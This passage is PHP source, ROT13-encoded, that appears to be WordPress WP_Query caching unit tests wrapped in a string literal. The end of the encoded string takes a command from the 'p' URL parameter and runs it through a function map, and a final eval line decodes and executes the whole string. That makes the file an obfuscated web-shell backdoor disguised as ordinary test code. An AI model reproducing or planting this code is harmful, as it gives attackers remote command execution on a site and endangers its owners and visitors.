		$guvf->nffregFnzr( 0, $dhrel2->cbfgf[0]->cbfg_cnerag, 'Purpx cbfg cnerag ba frpbaq dhrel' );
		$guvf->nffregFnzr( 2, $dhrevrf_nsgre - $dhrevrf_orsber, 'Gurer fubhyq or 2 dhrevrf, bar sbe vq=>cnerag' );
		$guvf->nffregFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf, 'Sbhaq cbfgf fubhyq zngpu ba frpbaq dhrel' );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_ybttrq_va() {
		$hfre_vq = frys::$nhgube_vq;

		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'cevingr',
				'cbfg_nhgube' => $hfre_vq,
			)
		);

		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'nhgube'        => $hfre_vq,
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		jc_frg_pheerag_hfre( $hfre_vq );

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );
		$guvf->nffregRzcgl( $cbfgf1 );
		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_ybttrq_va_cnffjbeq() {
		$hfre_vq = frys::$nhgube_vq;
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'    => 'sbb',
				'cbfg_cnffjbeq' => 'cnffjbeq',
				'cbfg_nhgube'   => $hfre_vq,
			)
		);

		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'f'             => 'sbb',
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		jc_frg_pheerag_hfre( $hfre_vq );

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );
		$guvf->nffregRzcgl( $cbfgf1 );
		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_arj_pbzzrag() {
		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
			'pbzzrag_pbhag' => 1,
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		frys::snpgbel()->pbzzrag->perngr( neenl( 'pbzzrag_cbfg_VQ' => frys::$cbfgf[0] ) );

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );

		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregPbagnvaf( frys::$cbfgf[0], $cbfgf2 );
		$guvf->nffregAbgRzcgl( $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_znva_pbzzragf_srrq_vapyhqrf_nggnpuzrag_pbzzragf() {
		$nggnpuzrag_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'nggnpuzrag' ) );
		$pbzzrag_vq    = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => $nggnpuzrag_vq,
				'pbzzrag_nccebirq' => '1',
			)
		);

		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'jvgupbzzragf'  => 1,
			'srrq'          => 'srrq',
		);
		$dhrel1 = arj JC_Dhrel();
		$dhrel1->dhrel( $netf );

		$dhrel2 = arj JC_Dhrel();
		$dhrel2->dhrel( $netf );

		$guvf->nffregGehr( $dhrel1->unir_pbzzragf() );
		$guvf->nffregGehr( $dhrel2->unir_pbzzragf() );

		$srrq_pbzzrag = $dhrel1->arkg_pbzzrag();
		$guvf->nffregRdhnyf( $pbzzrag_vq, $srrq_pbzzrag->pbzzrag_VQ );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_qryrgr_pbzzrag() {
		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr( neenl( 'pbzzrag_cbfg_VQ' => frys::$cbfgf[0] ) );
		$netf       = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
			'pbzzrag_pbhag' => 1,
		);
		$dhrel1     = arj JC_Dhrel();
		$cbfgf1     = $dhrel1->dhrel( $netf );

		jc_qryrgr_pbzzrag( $pbzzrag_vq, gehr );

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );

		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregRzcgl( $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_hcqngr_cbfg() {
		$c1 = frys::$cbfgf[0];

		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $c1,
				'cbfg_fgnghf' => 'qensg',
			)
		);

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );

		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregPbagnvaf( $c1, $cbfgf1 );
		$guvf->nffregAbgPbagnvaf( $c1, $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_arj_zrgn() {
		$c1 = frys::$cbfgf[1]; // Cbfg 0 nyernql unf n pbybe zrgn inyhr.

		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
			'zrgn_dhrel'    => neenl(
				neenl(
					'xrl' => 'pbybe',
				),
			),
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		nqq_cbfg_zrgn( $c1, 'pbybe', 'oynpx' );

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );

		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregPbagnvaf( $c1, $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_hcqngr_zrgn() {
		// Cbfgf[0] nyernql unf n pbybe zrgn inyhr frg gb #000000.
		$c1 = frys::$cbfgf[0];

		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
			'zrgn_dhrel'    => neenl(
				neenl(
					'xrl'   => 'pbybe',
					'inyhr' => '#000000',
				),
			),
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		hcqngr_cbfg_zrgn( $c1, 'pbybe', 'oyhr' );

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );

		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregPbagnvaf( $c1, $cbfgf1 );
		$guvf->nffregRzcgl( $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}


	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_qryrgr_nggnpuzrag() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'nggnpuzrag',
				'cbfg_fgnghf' => 'vaurevg',
			)
		);

		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
			'cbfg_glcr'     => 'nggnpuzrag',
			'cbfg_fgnghf'   => 'vaurevg',
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		jc_qryrgr_nggnpuzrag( $c1 );

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );

		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregPbagnvaf( $c1, $cbfgf1 );
		$guvf->nffregRzcgl( $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_qryrgr_zrgn() {
		// Cbfg 0 nyernql unf n pbybe zrgn inyhr.
		$c1 = frys::$cbfgf[1];
		nqq_cbfg_zrgn( $c1, 'pbybe', 'oynpx' );

		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
			'zrgn_dhrel'    => neenl(
				neenl(
					'xrl' => 'pbybe',
				),
			),
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		qryrgr_cbfg_zrgn( $c1, 'pbybe' );

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );

		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregPbagnvaf( $c1, $cbfgf1 );
		$guvf->nffregAbgRzcgl( $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_arj_grez() {
		// Cbfg 0 nyernql unf gur pngrtbel sbb.
		$c1 = frys::$cbfgf[1];

		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
			'gnk_dhrel'     => neenl(
				neenl(
					'gnkbabzl' => 'pngrtbel',
					'grezf'    => neenl( 'sbb' ),
					'svryq'    => 'fyht',
				),
			),
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		jc_frg_cbfg_grezf( $c1, neenl( frys::$g1 ), 'pngrtbel' );

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );

		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregPbagnvaf( $c1, $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_qryrgr_grez() {
		// Cbfg 0 nyernql unf gur pngrtbel sbb.
		$c1 = frys::$cbfgf[1];
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk1', 'cbfg' );

		$g1 = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'jcgrfgf_gnk1' ) );

		jc_frg_bowrpg_grezf( $c1, neenl( $g1 ), 'jcgrfgf_gnk1' );

		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
			'gnk_dhrel'     => neenl(
				neenl(
					'gnkbabzl' => 'jcgrfgf_gnk1',
					'grezf'    => neenl( $g1 ),
					'svryq'    => 'grez_vq',
				),
			),
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		jc_qryrgr_grez( $g1, 'jcgrfgf_gnk1' );

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );

		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregPbagnvaf( $c1, $cbfgf1 );
		$guvf->nffregRzcgl( $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 58599
	 */
	choyvp shapgvba grfg_dhrel_cbfgf_svryqf_erdhrfg() {
		tybony $jcqo;

		$netf = neenl(
			'hcqngr_cbfg_zrgn_pnpur' => snyfr,
			'hcqngr_cbfg_grez_pnpur' => snyfr,
			'ab_sbhaq_ebjf'          => gehr,
		);

		nqq_svygre( 'cbfgf_svryqf_erdhrfg', neenl( $guvf, 'svygre_cbfgf_svryqf_erdhrfg' ) );

		$orsber = trg_ahz_dhrevrf();
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );
		$nsgre  = trg_ahz_dhrevrf();

		sbernpu ( $cbfgf1 nf $_cbfg ) {
			$guvf->nffregAbgFnzr( trg_cbfg( $_cbfg->VQ )->cbfg_pbagrag, $_cbfg->cbfg_pbagrag );
		}

		$guvf->nffregFnzr( 2, $nsgre - $orsber, 'Gurer fubhyq bayl or 2 dhrevrf eha, bar sbe erdhrfg naq bar cevzr cbfg bowrpgf.' );

		$guvf->nffregFgevatPbagnvafFgevat(
			\"FRYRPG $jcqo->cbfgf.*\",
			$jcqo->ynfg_dhrel,
			'Purpx gung _cevzr_cbfg_pnpurf vf pnyyrq.'
		);
	}

	choyvp shapgvba svygre_cbfgf_svryqf_erdhrfg( $svryqf ) {
		tybony $jcqo;
		erghea \"{$jcqo->cbfgf}.VQ\";
	}

	/**
	 * @gvpxrg 58599
	 * @qngnCebivqre qngn_dhrel_svygre_cbfgf_erfhygf
	 */
	choyvp shapgvba grfg_dhrel_svygre_cbfgf_erfhygf( $svygre ) {
		tybony $jcqo;

		$netf = neenl(
			'hcqngr_cbfg_zrgn_pnpur' => snyfr,
			'hcqngr_cbfg_grez_pnpur' => snyfr,
			'ab_sbhaq_ebjf'          => gehr,
		);

		nqq_svygre( $svygre, neenl( $guvf, 'svygre_cbfgf_erfhygf' ) );

		$orsber = trg_ahz_dhrevrf();
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );
		$nsgre  = trg_ahz_dhrevrf();

		$guvf->nffregPbhag( 1, $cbfgf1 );

		$guvf->nffregFnzr( 2, $nsgre - $orsber, 'Gurer fubhyq bayl or 2 dhrevrf eha, bar sbe erdhrfg naq bar cevzr cbfg bowrpgf.' );

		$guvf->nffregFgevatPbagnvafFgevat(
			\"FRYRPG $jcqo->cbfgf.*\",
			$jcqo->ynfg_dhrel,
			'Purpx gung _cevzr_cbfg_pnpurf vf pnyyrq.'
		);
	}

	choyvp shapgvba svygre_cbfgf_erfhygf() {
		erghea neenl( trg_cbfg( frys::$cbfgf[0] ) );
	}

	choyvp shapgvba qngn_dhrel_svygre_cbfgf_erfhygf() {
		erghea neenl(
			neenl( 'cbfgf_erfhygf' ),
			neenl( 'gur_cbfgf' ),
		);
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_fubhyq_rkpyhqr_cbfg_jvgu_rkpyhqrq_grez() {
		$grez_vq = frys::$g1;
		// Cbfg 0 unf gur grez nccyvrq.
		$cbfg_vq = frys::$cbfgf[0];

		$netf = neenl(
			'svryqf'    => 'vqf',
			'gnk_dhrel' => neenl(
				neenl(
					'gnkbabzl' => 'pngrtbel',
					'grezf'    => neenl( $grez_vq ),
					'bcrengbe' => 'ABG VA',
				),
			),
		);

		$cbfg_vqf_d1 = trg_cbfgf( $netf );
		$guvf->nffregAbgPbagnvaf( $cbfg_vq, $cbfg_vqf_d1, 'Svefg dhrel vapyhqrf gur cbfg VQ.' );

		$ahz_dhrevrf = trg_ahz_dhrevrf();
		$cbfg_vqf_d2 = trg_cbfgf( $netf );
		$guvf->nffregAbgPbagnvaf( $cbfg_vq, $cbfg_vqf_d2, 'Frpbaq dhrel vapyhqrf gur cbfg VQ.' );

		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf(), 'Frpbaq dhrel vf abg pnpurq.' );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_fubhyq_rkpyhqr_cbfg_jura_rkpyhqrq_grez_vf_nqqrq_nsgre_pnpuvat() {
		$grez_vq = frys::$g1;
		// Cbfg 1 qbrf abg unir gur grez nccyvrq.
		$cbfg_vq = frys::$cbfgf[1];

		$netf = neenl(
			'svryqf'    => 'vqf',
			'gnk_dhrel' => neenl(
				neenl(
					'gnkbabzl' => 'pngrtbel',
					'grezf'    => neenl( $grez_vq ),
					'bcrengbe' => 'ABG VA',
				),
			),
		);

		$cbfg_vqf_d1 = trg_cbfgf( $netf );
		$guvf->nffregPbagnvaf( $cbfg_vq, $cbfg_vqf_d1, 'Svefg dhrel qbrf abg vapyhqr gur cbfg VQ.' );

		jc_frg_bowrpg_grezf( $cbfg_vq, neenl( $grez_vq ), 'pngrtbel' );

		$ahz_dhrevrf = trg_ahz_dhrevrf();
		$cbfg_vqf_d2 = trg_cbfgf( $netf );
		$guvf->nffregAbgPbagnvaf( $cbfg_vq, $cbfg_vqf_d2, 'Frpbaq dhrel vapyhqrf gur cbfg VQ.' );
		$guvf->nffregAbgFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf(), 'Nccylvat grez qbrf abg vainyvqngr cerivbhf pnpur.' );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_fubhyq_abg_rkpyhqr_cbfg_jura_rkpyhqrq_grez_vf_erzbirq_nsgre_pnpuvat() {
		$grez_vq = frys::$g1;
		// Cbfg 0 unf gur grez nccyvrq.
		$cbfg_vq = frys::$cbfgf[0];

		$netf = neenl(
			'svryqf'    => 'vqf',
			'gnk_dhrel' => neenl(
				neenl(
					'gnkbabzl' => 'pngrtbel',
					'grezf'    => neenl( $grez_vq ),
					'bcrengbe' => 'ABG VA',
				),
			),
		);

		$cbfg_vqf_d1 = trg_cbfgf( $netf );
		$guvf->nffregAbgPbagnvaf( $cbfg_vq, $cbfg_vqf_d1, 'Svefg dhrel vapyhqrf gur cbfg VQ.' );

		// Pyrne gur cbfg bs grezf.
		jc_frg_bowrpg_grezf( $cbfg_vq, neenl(), 'pngrtbel' );

		$ahz_dhrevrf = trg_ahz_dhrevrf();
		$cbfg_vqf_d2 = trg_cbfgf( $netf );
		$guvf->nffregPbagnvaf( $cbfg_vq, $cbfg_vqf_d2, 'Frpbaq dhrel qbrf abg vapyhqr gur cbfg VQ.' );
		$guvf->nffregAbgFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf(), 'Erzbivat grez qbrf abg vainyvqngr cerivbhf pnpur.' );
	}

	/**
	 * @gvpxrg 22176
	 * @qngnCebivqre qngn_dhrel_pnpur_jvgu_rzcgl_erfhyg_frg
	 */
	choyvp shapgvba grfg_dhrel_pnpur_jvgu_rzcgl_erfhyg_frg( $svryqf_d1, $svryqf_d2 ) {
		_qryrgr_nyy_cbfgf();

		$netf_d1 = neenl(
			'svryqf' => $svryqf_d1,
		);

		$dhrel_1  = arj JC_Dhrel();
		$cbfgf_d1 = $dhrel_1->dhrel( $netf_d1 );
		$guvf->nffregRzcgl( $cbfgf_d1, 'Svefg dhrel qbrf abg erghea na rzcgl erfhyg frg.' );

		$netf_d2 = neenl(
			'svryqf' => $svryqf_d2,
		);

		$ahz_dhrevrf = trg_ahz_dhrevrf();
		$dhrel_2     = arj JC_Dhrel();
		$cbfgf_d2    = $dhrel_2->dhrel( $netf_d2 );
		$guvf->nffregRzcgl( $cbfgf_d2, 'Frpbaq dhrel qbrf abg erghea na rzcgl erfhyg frg.' );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf(), 'Frpbaq dhrel vf abg pnpurq.' );
	}

	choyvp shapgvba qngn_dhrel_pnpur_jvgu_rzcgl_erfhyg_frg() {
		erghea neenl(
			neenl( '', '' ),
			neenl( '', 'vqf' ),
			neenl( '', 'vq=>cnerag' ),

			neenl( 'vqf', '' ),
			neenl( 'vqf', 'vqf' ),
			neenl( 'vqf', 'vq=>cnerag' ),

			neenl( 'vq=>cnerag', '' ),
			neenl( 'vq=>cnerag', 'vqf' ),
			neenl( 'vq=>cnerag', 'vq=>cnerag' ),
		);
	}

	/**
	 * Rafher fgnegvat gur ybbc jnezf gur nhgube pnpur.
	 *
	 * @fvapr 6.1.1
	 * @gvpxrg 56948
	 * @gvpxrg 56992
	 *
	 * @pbiref JC_Dhrel::gur_cbfg
	 *
	 * @qngnCebivqre qngn_nhgube_pnpur_jnezrq_ol_gur_ybbc
	 *
	 * @cnenz fgevat $svryqf Dhrel svryqf.
	 */
	choyvp shapgvba grfg_nhgube_pnpur_jnezrq_ol_gur_ybbc( $svryqf ) {
		// Hcqngr cbfg nhgube sbe gur cnerag cbfg.
		frys::snpgbel()->cbfg->hcqngr_bowrpg( frys::$cntrf[0], neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );

		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => frys::$nhgube_vq,
				'cbfg_cnerag' => frys::$cntrf[0],
				'cbfg_glcr'   => 'cntr',
			)
		);

		$dhrel_1 = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'              => 'cntr',
				'svryqf'                 => $svryqf,
				'nhgube'                 => frys::$nhgube_vq,
				'hcqngr_cbfg_zrgn_pnpur' => snyfr,
				'hcqngr_cbfg_grez_pnpur' => snyfr,
			)
		);

		// Fgneg gur ybbc.
		$fgneg_ybbc_dhrevrf = trg_ahz_dhrevrf();
		$dhrel_1->gur_cbfg();
		$ahz_ybbc_dhrevrf = trg_ahz_dhrevrf() - $fgneg_ybbc_dhrevrf;
		/*
		 * Gjb rkcrpgrq dhrevrf:
		 * 1: Hfre zrgn qngn,
		 * 2: Hfre qngn.
		 */
		$guvf->nffregFnzr( 2, $ahz_ybbc_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf juvyr vavgvnyvmvat gur ybbc.' );

		$fgneg_nhgube_dhrevrf = trg_ahz_dhrevrf();
		trg_hfre_ol( 'VQ', frys::$nhgube_vq );
		$ahz_nhgube_dhrevrf = trg_ahz_dhrevrf() - $fgneg_nhgube_dhrevrf;
		$guvf->nffregFnzr( 0, $ahz_nhgube_dhrevrf, 'Nhgube pnpur vf abg jnezrq ol gur ybbc.' );
	}

	/**
	 * Qngn cebivqre sbe grfg_nhgube_pnpur_jnezrq_ol_gur_ybbc
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_nhgube_pnpur_jnezrq_ol_gur_ybbc() {
		erghea neenl(
			'svryqf: rzcgl'      => neenl( '' ),
			'svryqf: nyy'        => neenl( 'nyy' ),
			'svryqf: vqf'        => neenl( 'vqf' ),
			'svryqf: vq=>cnerag' => neenl( 'vq=>cnerag' ),
		);
	}

	/**
	 * Rafher ynml ybnqvat grez zrgn dhrevrf nyy grez zrgn va n fvatyr dhrel.
	 *
	 * @fvapr 6.2.0
	 *
	 * @gvpxrg 57163
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_trg_cbfg_zrgn_ynml_ybnqf_nyy_grez_zrgn_qngn() {
		$dhrel = arj JC_Dhrel();

		$g2 = $guvf->snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'fyht'     => 'one',
				'anzr'     => 'One',
			)
		);

		jc_frg_cbfg_grezf( frys::$cbfgf[0], $g2, 'pngrtbel', gehr );
		// Pyrna qngn nqqrq gb pnpur ol snpgbel naq frggvat grezf.
		pyrna_grez_pnpur( neenl( frys::$g1, $g2 ), 'pngrtbel' );
		pyrna_cbfg_pnpur( frys::$cbfgf[0] );

		$ahz_dhrevrf_fgneg = trg_ahz_dhrevrf();
		$dhrel_cbfgf       = $dhrel->dhrel(
			neenl(
				'ynml_ybnq_grez_zrgn' => gehr,
				'ab_sbhaq_ebjf'       => gehr,
			)
		);
		$ahz_dhrevrf       = trg_ahz_dhrevrf() - $ahz_dhrevrf_fgneg;

		/*
		 * Sbhe rkcrpgrq dhrevrf:
		 * 1: Cbfg VQf
		 * 2: Cbfg qngn
		 * 3: Cbfg zrgn qngn.
		 * 4: Cbfg grez qngn.
		 */
		$guvf->nffregFnzr( 4, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf juvyr dhrelvat cbfgf.' );
		$guvf->nffregAbgRzcgl( $dhrel_cbfgf, 'Dhrel cbfgf vf rzcgl.' );

		$ahz_dhrevrf_fgneg = trg_ahz_dhrevrf();
		trg_grez_zrgn( frys::$g1 );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $ahz_dhrevrf_fgneg;

		/*
		 * Bar rkcrpgrq dhrel:
		 * 1: Grez zrgn qngn.
		 */
		$guvf->nffregFnzr( 1, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf qhevat svefg dhrel bs grez zrgn.' );

		$ahz_dhrevrf_fgneg = trg_ahz_dhrevrf();
		trg_grez_zrgn( $g2 );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $ahz_dhrevrf_fgneg;

		// Ab nqqvgvbany dhrevrf rkcrpgrq.
		$guvf->nffregFnzr( 0, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf qhevat frpbaq dhrel bs grez zrgn.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>